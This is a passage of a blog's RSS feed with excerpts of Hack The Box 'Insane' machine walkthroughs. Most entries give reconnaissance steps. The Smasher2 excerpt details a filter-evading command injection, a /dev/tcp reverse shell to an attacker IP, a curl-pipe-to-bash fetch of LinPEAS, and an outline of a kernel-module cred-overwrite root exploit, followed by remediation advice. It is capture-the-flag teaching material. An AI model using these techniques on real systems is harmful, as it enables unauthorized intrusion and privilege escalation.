 &lt;/div&gt;

&lt;h2 id="exploitation-steps"&gt;Exploitation Steps&lt;/h2&gt;
&lt;p&gt;Below is a chronological extraction of the key exploitation steps and techniques used in the &amp;ldquo;Fortune&amp;rdquo; Hack The Box challenge, as described in the provided transcript:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Initial Reconnaissance with Nmap&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Technique&lt;/strong&gt;: Port scanning and service enumeration&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Step&lt;/strong&gt;: Ran &lt;code&gt;nmap -sC -sV -oA nmap/fortune [TARGET-IP]&lt;/code&gt; to identify open ports and services.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Findings&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;Port 22 (SSH, OpenSSH 7.9)&lt;/li&gt;
&lt;li&gt;Port 80 (HTTP, OpenBSD httpd)&lt;/li&gt;
&lt;li&gt;Port 443 (HTTPS, requires client certificate, TLS randomness issue noted)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Web Enumeration on Port 443 (HTTPS)&lt;/strong&gt;&lt;/p&gt;</description></item><item><title>Kryptos HTB - Insane Linux Box Walkthrough</title><link>https://malayamanas.github.io/posts/kryptos-htb-walkthrough/</link><pubDate>Mon, 22 Sep 2025 08:30:00 +0000</pubDate><guid>https://malayamanas.github.io/posts/kryptos-htb-walkthrough/</guid><description>&lt;h1 id="kryptos-htb---insane-linux-box-walkthrough"&gt;Kryptos HTB - Insane Linux Box Walkthrough&lt;/h1&gt;
&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"&gt;
 &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/4uCoI5YzOwk?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"&gt;&lt;/iframe&gt;
 &lt;/div&gt;

&lt;h2 id="key-exploitation-steps-and-techniques-chronological-order"&gt;Key Exploitation Steps and Techniques (Chronological Order)&lt;/h2&gt;
&lt;p&gt;The following is a chronological extraction of the key exploitation steps and techniques from the provided transcript. I&amp;rsquo;ve focused on the core actions, vulnerabilities exploited, and tools/techniques used, based on the walkthrough&amp;rsquo;s narrative flow. Steps are numbered and include brief descriptions, techniques, and relevant tools/commands for clarity.&lt;/p&gt;</description></item><item><title>Smasher2 HTB - Insane Linux Box Walkthrough</title><link>https://malayamanas.github.io/posts/smasher2-htb-walkthrough/</link><pubDate>Mon, 22 Sep 2025 08:15:00 +0000</pubDate><guid>https://malayamanas.github.io/posts/smasher2-htb-walkthrough/</guid><description>&lt;h1 id="smasher2-htb---insane-linux-box-walkthrough"&gt;Smasher2 HTB - Insane Linux Box Walkthrough&lt;/h1&gt;
&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"&gt;
 &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/ELiicja60jI?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"&gt;&lt;/iframe&gt;
 &lt;/div&gt;

&lt;h2 id="exploitation-steps"&gt;Exploitation Steps&lt;/h2&gt;
&lt;h3 id="enumeration-phase"&gt;Enumeration Phase&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Nmap Scan&lt;/strong&gt;: Run &lt;code&gt;nmap -sC -sV -oA smasher2 [TARGET-IP]&lt;/code&gt; to identify open ports: SSH (22), DNS (53/TCP, ISC BIND), HTTP (80, Apache on Ubuntu). Note DNS on TCP suggests testing zone transfers.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;DNS Zone Transfer&lt;/strong&gt;: Use &lt;code&gt;dig axfr @[TARGET-IP] smasher2.htb&lt;/code&gt; to dump the zone, revealing subdomain &lt;code&gt;wonderfulsessionmanager.smasher2.htb&lt;/code&gt;. Add to hosts file and access the website.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;HTTP Enumeration&lt;/strong&gt;: Access &lt;code&gt;http://[TARGET-IP]&lt;/code&gt; (403 Forbidden) and &lt;code&gt;http://wonderfulsessionmanager.smasher2.htb&lt;/code&gt; (login page). Test default creds (admin/admin, guest/guest) and basic SQL injection, but fails.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;User-Agent Filtering Check&lt;/strong&gt;: Analyze Nmap&amp;rsquo;s HTTP probe in Wireshark/Burp; discover blacklist on &amp;ldquo;Nmap Scripting Engine&amp;rdquo;. Use custom user-agent for further scans.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Directory Brute-Force&lt;/strong&gt;: Run Gobuster with &lt;code&gt;gobuster dir -u http://[TARGET-IP] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -a &amp;quot;Mozilla/5.0 (compatible;)&amp;quot; -o gobuster_root.out&lt;/code&gt;, finding &lt;code&gt;/backup&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="web-application-analysis-and-bypass"&gt;Web Application Analysis and Bypass&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Download Backup Files&lt;/strong&gt;: From &lt;code&gt;/backup&lt;/code&gt;, download &lt;code&gt;sso.c&lt;/code&gt; (C library) and &lt;code&gt;sso.py&lt;/code&gt; (Flask app). Note logging to &lt;code&gt;creds.log&lt;/code&gt; (forbidden access).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Source Code Review&lt;/strong&gt;: In &lt;code&gt;sso.py&lt;/code&gt;, identify login endpoint &lt;code&gt;/auth&lt;/code&gt; (POST with JSON data). Calls C functions from &lt;code&gt;sso.so&lt;/code&gt;. Grep for functions like &lt;code&gt;log_creds&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Reverse Engineering with Ghidra&lt;/strong&gt;: Decompile &lt;code&gt;sso.so&lt;/code&gt;. Analyze &lt;code&gt;session_manager_check_login&lt;/code&gt;: Parses POST data, extracts username/password. Bug: &lt;code&gt;get_internal_user&lt;/code&gt; and &lt;code&gt;get_internal_pwd&lt;/code&gt; both return username from credentials struct, allowing login if password == username.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Debugging with GDB&lt;/strong&gt;: Load in Python2 interpreter, attach GDB to step through &lt;code&gt;check_login&lt;/code&gt;, confirm username/password comparison uses same value. Handle segfaults from lockouts.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Login Bypass&lt;/strong&gt;: Brute-force usernames with matching passwords (e.g., &amp;ldquo;Administrator&amp;rdquo;/&amp;ldquo;Administrator&amp;rdquo;). Success grants API key. Lockout (10 attempts) is intended vuln, but bypassed.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="command-execution-and-shell"&gt;Command Execution and Shell&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;API Endpoint Access&lt;/strong&gt;: POST to &lt;code&gt;/api/&amp;lt;api_key&amp;gt;/job&lt;/code&gt; with JSON &lt;code&gt;{&amp;quot;schedule&amp;quot;: &amp;quot;&amp;lt;command&amp;gt;&amp;quot;}&lt;/code&gt;. Test reveals command execution.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Web Filter Evasion&lt;/strong&gt;: Commands with spaces forbidden (403). Use Bash brace expansion (e.g., &lt;code&gt;{echo,test}&lt;/code&gt; expands to &amp;ldquo;echo test&amp;rdquo;). Avoid spaces with commas in braces.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Base64 Encoding for Complex Commands&lt;/strong&gt;: Base64-encode payloads (e.g., reverse shell), decode/execute with &lt;code&gt;{base64,-d}|{bash,-i}&lt;/code&gt; to evade filters on flags like &lt;code&gt;-d&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Reverse Shell&lt;/strong&gt;: Encode &lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/[ATTACKER-IP]/9001 0&amp;gt;&amp;amp;1&lt;/code&gt;, send via API. Catch with &lt;code&gt;nc -lvnp 9001&lt;/code&gt;. Upgrade shell via SSH key drop (generate key, add to &lt;code&gt;.ssh/authorized_keys&lt;/code&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="privilege-escalation"&gt;Privilege Escalation&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Enumeration with LinPEAS&lt;/strong&gt;: Run LinPEAS script (&lt;code&gt;curl [ATTACKER-IP]:9001/linpeas.sh | bash&lt;/code&gt;). Highlights unsigned kernel module &lt;code&gt;d_hid.ko&lt;/code&gt; (signature verification failed).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Download and Analyze Module&lt;/strong&gt;: SCP &lt;code&gt;d_hid.ko&lt;/code&gt; locally, decompile in Ghidra. Identify device &lt;code&gt;/dev/d_hid&lt;/code&gt; (block device, registered in init). Read/open functions copy data to user space.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Memory Mapping Exploit&lt;/strong&gt;: Use &lt;code&gt;mmap&lt;/code&gt; to map &lt;code&gt;/dev/d_hid&lt;/code&gt; (kernel space) to user space. Search mapped memory for credential struct (sequence of UID/GID 1000 x8). Overwrite UIDs/GIDs to 0 (root).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Exploit Code Development&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;Open &lt;code&gt;/dev/d_hid&lt;/code&gt; (O_RDWR).&lt;/li&gt;
&lt;li&gt;Map large memory range (e.g., 0x42424242 bytes starting at 0x42424200) with &lt;code&gt;mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0)&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Scan for cred struct: Loop through addresses, check for 8 consecutive UIDs (1000).&lt;/li&gt;
&lt;li&gt;Overwrite: Set UIDs/GIDs to 0, skip secure bits (4 bytes). Set capabilities to 0x1234 (full).&lt;/li&gt;
&lt;li&gt;Launch shell: &lt;code&gt;execl(&amp;quot;/bin/sh&amp;quot;, &amp;quot;sh&amp;quot;, NULL)&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Execution&lt;/strong&gt;: Compile exploit.c, run on box. Gains root shell. Note: Overwriting affects all processes if not targeted.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="security-gaps-and-remediation"&gt;Security Gaps and Remediation&lt;/h2&gt;
&lt;h3 id="dns-service-isc-bind-on-port-53tcp"&gt;DNS Service (ISC BIND on Port 53/TCP)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Gap: Unrestricted Zone Transfer (AXFR)&lt;/strong&gt;
The DNS server allows zone transfers to unauthorized clients, leaking subdomain information (e.g., wonderfulsessionmanager.smasher2.htb).
&lt;strong&gt;Fix Type: Configuration&lt;/strong&gt;
In BIND&amp;rsquo;s named.conf, add &lt;code&gt;allow-transfer { trusted_ips; };&lt;/code&gt; to restrict AXFR to specific IP addresses or ACLs.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="http-server-apache-on-port-80"&gt;HTTP Server (Apache on Port 80)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Gap: User-Agent Based Blacklisting&lt;/strong&gt;
The server blocks requests with specific user-agents like &amp;ldquo;Nmap Scripting Engine&amp;rdquo; (403 Forbidden), but it&amp;rsquo;s easily bypassed by changing the user-agent. This indicates incomplete or weak WAF rules.
&lt;strong&gt;Fix Type: Configuration&lt;/strong&gt;
Enhance Apache mod_security or .htaccess rules to use more robust filtering (e.g., regex on broader patterns) or remove if not needed; example: &lt;code&gt;&amp;lt;If &amp;quot;%{HTTP_USER_AGENT} =~ /nmap/i&amp;quot;&amp;gt; Deny from all &amp;lt;/If&amp;gt;&lt;/code&gt; but expand to cover variations.&lt;/p&gt;</description></item><item><title>Dyplesher HTB - Insane Linux Box Walkthrough</title><link>https://malayamanas.github.io/posts/dyplesher-htb-walkthrough/</link><pubDate>Mon, 22 Sep 2025 08:00:00 +0000</pubDate><guid>https://malayamanas.github.io/posts/dyplesher-htb-walkthrough/</guid><description>&lt;h1 id="dyplesher-htb---insane-linux-box-walkthrough"&gt;Dyplesher HTB - Insane Linux Box Walkthrough&lt;/h1&gt;
&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"&gt;
 &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/F6oSpOWOjSQ?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"&gt;&lt;/iframe&gt;
 &lt;/div&gt;

&lt;p&gt;Below is a chronological extraction of the key exploitation steps and techniques used in the &amp;ldquo;Dyplesher&amp;rdquo; machine from Hack The Box, as described in the provided transcript. The steps are derived from the detailed walkthrough and organized to reflect the sequence of actions taken to gain initial access, escalate privileges, and achieve the final objective.&lt;/p&gt;</description></item><item><title>Fatty HTB - Insane Linux Box Walkthrough</title><link>https://malayamanas.github.io/posts/fatty-htb-walkthrough/</link><pubDate>Mon, 22 Sep 2025 08:00:00 +0000</pubDate><guid>https://malayamanas.github.io/posts/fatty-htb-walkthrough/</guid><description>&lt;h1 id="fatty-htb---insane-linux-box-walkthrough"&gt;Fatty HTB - Insane Linux Box Walkthrough&lt;/h1&gt;
&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"&gt;
 &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/3bvKLj0akMM?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"&gt;&lt;/iframe&gt;
 &lt;/div&gt;

&lt;h2 id="key-exploitation-steps-and-techniques-chronological-order"&gt;Key Exploitation Steps and Techniques (Chronological Order)&lt;/h2&gt;
&lt;p&gt;Below is a chronological extraction of the key exploitation steps and techniques used in the provided data for the &amp;ldquo;Fatty&amp;rdquo; box from Hack The Box, as described in the video transcript. The steps focus on the process of exploiting the thick Java client and gaining root access to the target system.&lt;/p&gt;</description></item><item><title>Fingerprint HTB - Insane Linux Box Walkthrough</title><link>https://malayamanas.github.io/posts/fingerprint-htb-walkthrough/</link><pubDate>Mon, 22 Sep 2025 08:00:00 +0000</pubDate><guid>https://malayamanas.github.io/posts/fingerprint-htb-walkthrough/</guid><description>&lt;h1 id="fingerprint-htb---insane-linux-box-walkthrough"&gt;Fingerprint HTB - Insane Linux Box Walkthrough&lt;/h1&gt;
&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"&gt;
 &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/YBabDbyk3eo?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"&gt;&lt;/iframe&gt;
 &lt;/div&gt;

&lt;p&gt;Below is a chronological summary of the key exploitation steps and techniques used in the &amp;ldquo;Fingerprint&amp;rdquo; machine from Hack The Box, as described in the provided data:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Initial Reconnaissance with Nmap&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Technique: Network scanning using &lt;code&gt;nmap -sC -sV -oA fingerprint &amp;lt;IP&amp;gt;&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Findings: Identified open ports: SSH (22), HTTP (80, running Werkzeug on Python 2), and HTTP (8080, running Sun GlassFish 5.0.1, Java-based). Noted outdated software versions (Python 2, GlassFish ~2017-2018).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Web Enumeration&lt;/strong&gt;:&lt;/p&gt;</description></item><item><title>Laser HTB - Insane Linux Box Walkthrough</title><link>https://malayamanas.github.io/posts/laser-htb-walkthrough/</link><pubDate>Mon, 22 Sep 2025 07:45:00 +0000</pubDate><guid>https://malayamanas.github.io/posts/laser-htb-walkthrough/</guid><description>&lt;h1 id="laser-htb---insane-linux-box-walkthrough"&gt;Laser HTB - Insane Linux Box Walkthrough&lt;/h1&gt;
&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"&gt;
 &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/vD3jSJlc0ro?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"&gt;&lt;/iframe&gt;
 &lt;/div&gt;

&lt;h2 id="exploitation-steps"&gt;Exploitation Steps&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Initial Reconnaissance with Nmap&lt;/strong&gt;: Perform an Nmap scan to identify open ports: 22 (SSH), 9000 (unknown service, possibly HTTP/2-based), and 9100 (JetDirect printer port). Technique: Port scanning and service enumeration.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Printer Interaction with PRET Toolkit&lt;/strong&gt;: Use the Printer Exploitation Toolkit (PRET) to connect to port 9100 via PJL mode. List directories and dump a queued print job from /pjl/jobs, resulting in Base64-encoded encrypted data. Technique: Printer protocol exploitation for data dumping.&lt;/p&gt;</description></item><item><title>Rope 2 HTB - Insane Linux Box Walkthrough</title><link>https://malayamanas.github.io/posts/rope2-htb-walkthrough/</link><pubDate>Mon, 22 Sep 2025 07:30:00 +0000</pubDate><guid>https://malayamanas.github.io/posts/rope2-htb-walkthrough/</guid><description>&lt;h1 id="rope-2-htb---insane-linux-box-walkthrough"&gt;Rope 2 HTB - Insane Linux Box Walkthrough&lt;/h1&gt;
&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"&gt;
 &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/m6Fpc3zxrJg?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"&gt;&lt;/iframe&gt;
 &lt;/div&gt;

&lt;h2 id="key-exploitation-steps-and-techniques-chronological-order"&gt;Key Exploitation Steps and Techniques (Chronological Order)&lt;/h2&gt;
&lt;p&gt;The transcript describes a step-by-step exploitation of a V8 JavaScript engine vulnerability in a custom Chrome browser on the &amp;ldquo;Rope 2&amp;rdquo; CTF box. The bug involves out-of-bounds (OOB) read/write in &lt;code&gt;array.getLastElement&lt;/code&gt; and &lt;code&gt;array.setLastElement&lt;/code&gt; functions, leading to type confusion, arbitrary read/write primitives, and code execution. Below is a chronological extraction of the key steps and techniques, based on the narrator&amp;rsquo;s actions and explanations.&lt;/p&gt;</description></item><item><title>Crossfit HTB - Insane Linux Box Walkthrough</title><link>https://malayamanas.github.io/posts/crossfit-htb-walkthrough/</link><pubDate>Mon, 22 Sep 2025 07:15:00 +0000</pubDate><guid>https://malayamanas.github.io/posts/crossfit-htb-walkthrough/</guid><description>&lt;h1 id="crossfit-htb---insane-linux-box-walkthrough"&gt;Crossfit HTB - Insane Linux Box Walkthrough&lt;/h1&gt;
&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"&gt;
 &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/Z3Lj_YN0crc?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"&gt;&lt;/iframe&gt;
 &lt;/div&gt;

&lt;h2 id="key-exploitation-steps-and-techniques-chronological-order"&gt;Key Exploitation Steps and Techniques (Chronological Order)&lt;/h2&gt;
&lt;p&gt;Based on the transcript, the following outlines the main exploitation steps and techniques used to compromise the &amp;ldquo;Crossfit&amp;rdquo; machine on Hack The Box. I&amp;rsquo;ve focused on the core technical actions, omitting unrelated details like note-taking with Obsidian or tool installations (e.g., Flameshot). Steps are presented in the sequence they occurred in the walkthrough.&lt;/p&gt;</description></item><item><title>Attended HTB - Insane OpenBSD Box Walkthrough</title><link>https://malayamanas.github.io/posts/attended-htb-walkthrough/</link><pubDate>Mon, 22 Sep 2025 07:00:00 +0000</pubDate><guid>https://malayamanas.github.io/posts/attended-htb-walkthrough/</guid><description>&lt;h1 id="attended-htb---insane-openbsd-box-walkthrough"&gt;Attended HTB - Insane OpenBSD Box Walkthrough&lt;/h1&gt;
&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"&gt;
 &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/ABVR8EgXsQU?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"&gt;&lt;/iframe&gt;
 &lt;/div&gt;

&lt;h2 id="exploitation-steps"&gt;Exploitation Steps&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Initial Reconnaissance (Nmap Scan)&lt;/strong&gt;: Perform an Nmap scan on the target IP ([TARGET-IP]) to identify open ports: SSH on 22 and SMTP on 25. Discover hostname attended.htb, potential user &amp;ldquo;gully&amp;rdquo;, OS OpenBSD, and SMTP server OpenSMTPD.&lt;/p&gt;</description></item><item><title>Crossfit 2 HTB - Insane OpenBSD Box Walkthrough</title><link>https://malayamanas.github.io/posts/crossfit2-htb-walkthrough/</link><pubDate>Mon, 22 Sep 2025 06:45:00 +0000</pubDate><guid>https://malayamanas.github.io/posts/crossfit2-htb-walkthrough/</guid><description>&lt;h1 id="crossfit-2-htb---insane-openbsd-box-walkthrough"&gt;Crossfit 2 HTB - Insane OpenBSD Box Walkthrough&lt;/h1&gt;
&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"&gt;
 &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/OUjdPa11tGw?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"&gt;&lt;/iframe&gt;
 &lt;/div&gt;

&lt;p&gt;Below is a chronological extraction of the key exploitation steps and techniques used in the &amp;ldquo;Crossfit 2&amp;rdquo; Hack The Box challenge, as described in the provided data. The steps are organized in the order they were performed, focusing on the critical actions and techniques that advanced the exploitation process.&lt;/p&gt;</description></item><item><title>Sink HTB - Insane Linux Box Walkthrough</title><link>https://malayamanas.github.io/posts/sink-htb-walkthrough/</link><pubDate>Mon, 22 Sep 2025 06:30:00 +0000</pubDate><guid>https://malayamanas.github.io/posts/sink-htb-walkthrough/</guid><description>&lt;h1 id="sink-htb---insane-linux-box-walkthrough"&gt;Sink HTB - Insane Linux Box Walkthrough&lt;/h1&gt;
&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"&gt;
 &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/8gf5YvvY1yc?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"&gt;&lt;/iframe&gt;
 &lt;/div&gt;

&lt;p&gt;Below is a chronological extraction of the key exploitation steps and techniques used in the provided data, based on the narrative of the &amp;ldquo;Sink&amp;rdquo; box from Hack The Box, as described in the YouTube video transcript. The steps are organized in the order they were performed, focusing on the critical actions and techniques used to progress through the exploitation process.&lt;/p&gt;</description></item><item><title>Stacked HTB - Insane Linux Box Walkthrough</title><link>https://malayamanas.github.io/posts/stacked-htb-walkthrough/</link><pubDate>Mon, 22 Sep 2025 06:15:00 +0000</pubDate><guid>https://malayamanas.github.io/posts/stacked-htb-walkthrough/</guid><description>&lt;h1 id="stacked-htb---insane-linux-box-walkthrough"&gt;Stacked HTB - Insane Linux Box Walkthrough&lt;/h1&gt;
&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"&gt;
 &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/aWXfEDIYZu8?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"&gt;&lt;/iframe&gt;
 &lt;/div&gt;

&lt;h2 id="exploitation-steps"&gt;Exploitation Steps&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Initial Nmap Scan&lt;/strong&gt;: Perform an Nmap scan with default scripts and version enumeration on the target IP ([TARGET-IP]), revealing open ports 22 (SSH on Ubuntu) and 80 (HTTP on Apache/Ubuntu). The HTTP title indicates a redirect to stacked.htb.&lt;/p&gt;</description></item><item><title>Toby HTB - Insane Linux Box Walkthrough</title><link>https://malayamanas.github.io/posts/toby-htb-walkthrough/</link><pubDate>Mon, 22 Sep 2025 06:00:00 +0000</pubDate><guid>https://malayamanas.github.io/posts/toby-htb-walkthrough/</guid><description>&lt;h1 id="toby-htb---insane-linux-box-walkthrough"&gt;Toby HTB - Insane Linux Box Walkthrough&lt;/h1&gt;
&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"&gt;
 &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/XROkuXKgeg8?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"&gt;&lt;/iframe&gt;
 &lt;/div&gt;

&lt;h2 id="exploitation-steps"&gt;Exploitation Steps&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Initial Reconnaissance with Nmap&lt;/strong&gt;: Performed an Nmap scan (&lt;code&gt;nmap -sC -sV -oA toby 10.10.11.121&lt;/code&gt;) to identify open ports: SSH (22) and HTTP (80) on an Ubuntu server running Nginx and WordPress.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Host File Modification and Website Access&lt;/strong&gt;: Added &lt;code&gt;wordpress.toby.htb&lt;/code&gt; to &lt;code&gt;/etc/hosts&lt;/code&gt; to access the WordPress blog, which mentioned a prior attack and recovery from the cloud.&lt;/p&gt;</description></item><item><title>Scanned HTB - Insane Linux Box Walkthrough</title><link>https://malayamanas.github.io/posts/scanned-htb-walkthrough/</link><pubDate>Mon, 22 Sep 2025 05:50:00 +0000</pubDate><guid>https://malayamanas.github.io/posts/scanned-htb-walkthrough/</guid><description>&lt;h1 id="scanned-htb---insane-linux-box-walkthrough"&gt;Scanned HTB - Insane Linux Box Walkthrough&lt;/h1&gt;
&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"&gt;
